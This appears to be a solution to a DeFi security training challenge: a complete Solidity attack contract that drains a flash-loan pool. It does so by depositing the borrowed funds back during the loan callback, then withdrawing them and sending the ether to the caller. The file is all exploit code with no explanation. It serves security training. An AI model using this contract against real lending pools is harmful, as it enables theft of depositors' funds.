pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract AttackerSideEntrance {
    using Address for address payable;

    function execute() external payable {
        ISideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    }

    function attack(ISideEntranceLenderPool pool) external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        msg.sender.sendValue(address(this).balance);
    }

    receive() external payable {}
}
